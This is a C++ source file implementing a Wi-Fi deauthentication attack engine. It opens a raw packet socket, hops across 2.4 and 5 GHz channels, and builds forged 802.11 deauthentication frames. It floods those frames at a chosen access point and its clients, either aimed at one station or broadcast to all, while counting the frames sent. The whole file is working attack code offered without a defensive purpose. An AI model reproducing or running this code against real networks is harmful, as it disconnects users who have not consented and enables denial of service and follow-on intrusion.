#include "cpp_deauth_engine.h"
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <netinet/in.h>
#include <net/ethernet.h>

#undef ifr_name

CppDeauthEngine::CppDeauthEngine(const std::string& iface, const std::string& bssid,
                                 const std::string& station, uint16_t reason)
    : iface_(iface), reason_(reason) {
    auto parse = [](const std::string& mac, uint8_t* out) {
        unsigned int b[6];
        if (std::sscanf(mac.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
                        &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) == 6)
            for (int i=0;i<6;i++) out[i] = (uint8_t)b[i];
    };
    parse(bssid, bssid_);
    if (station != "FF:FF:FF:FF:FF:FF")
        parse(station, station_);
    else
        std::memset(station_, 0xFF, 6);
    targeted_ = std::memcmp(station_, "\xff\xff\xff\xff\xff\xff", 6) != 0;
}

CppDeauthEngine::~CppDeauthEngine() { stop(); }

int CppDeauthEngine::open_socket() {
    struct sockaddr_ll sll;
    int fd = ::socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_ifrn.ifrn_name, iface_.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { ::close(fd); return -1; }
    std::memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (::bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { ::close(fd); return -1; }
    return fd;
}

void CppDeauthEngine::set_channel(int ch) {
    int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct iwreq wr;
    memset(&wr, 0, sizeof(wr));
    std::strncpy(wr.ifr_ifrn.ifrn_name, iface_.c_str(), IFNAMSIZ - 1);
    int freq;
    if (ch <= 13)
        freq = 2407 + ch * 5;
    else
        freq = 5000 + ch * 5;
    wr.u.freq.m = freq;
    wr.u.freq.e = 6;
    ioctl(fd, SIOCSIWFREQ, &wr);
    ::close(fd);
}

void CppDeauthEngine::build_frame(uint8_t* buf, const uint8_t* bssid,
                                   const uint8_t* station, uint16_t reason, uint16_t seq) {
    std::memset(buf, 0, 38);
    buf[0]=0x00; buf[1]=0x00; buf[2]=0x0C; buf[3]=0x00;
    buf[4]=0x02; buf[5]=0x00; buf[6]=0x00; buf[7]=0x00;
    buf[8]=0x00;
    buf[12]=0xC0; buf[13]=0x00;
    buf[14]=0x3A; buf[15]=0x01;
    std::memcpy(&buf[16], station, 6);
    std::memcpy(&buf[22], bssid, 6);
    std::memcpy(&buf[28], bssid, 6);
    buf[34]=(uint8_t)((seq<<4)&0xFF);
    buf[35]=(uint8_t)(((seq<<4)>>8)&0xFF);
    buf[36]=(uint8_t)(reason&0xFF);
    buf[37]=(uint8_t)((reason>>8)&0xFF);
}

void CppDeauthEngine::start() {
    if (running_.exchange(true)) return;
    worker_ = std::thread(&CppDeauthEngine::loop, this);
    worker_.detach();
}

void CppDeauthEngine::stop() {
    running_ = false;
    if (worker_.joinable()) worker_.join();
}

void CppDeauthEngine::loop() {
    int fd = open_socket();
    if (fd < 0) { running_ = false; return; }

    int channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,
                      36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165,169};
    int num_ch = sizeof(channels)/sizeof(channels[0]);
    int ch_idx = 0;
    uint16_t seq = 0;

    while (running_) {
        int cur_ch = channels[ch_idx % num_ch];
        if (channel_hop_) set_channel(cur_ch);
        ch_idx++;

        std::vector<uint8_t> frames;
        frames.reserve(burst_ * (targeted_ ? 2 : 1) * 38);

        for (int i = 0; i < burst_ && running_; i++) {
            uint8_t f[38];
            build_frame(f, bssid_, station_, reason_, seq);
            seq = (seq + 1) & 0xFFF;
            frames.insert(frames.end(), f, f + 38);

            if (targeted_) {
                build_frame(f, station_, bssid_, reason_, seq);
                seq = (seq + 1) & 0xFFF;
                frames.insert(frames.end(), f, f + 38);
            }
        }

        long long batch = 0;
        for (size_t off = 0; off < frames.size(); off += 38) {
            if (::send(fd, &frames[off], 38, 0) > 0) batch++;
        }

        sent_ += batch;
        std::fprintf(stderr, "\r[C++-v1] Deauth: %lld sent (ch %d, batch %lld)", sent_.load(), cur_ch, batch);
    }
    ::close(fd);
}
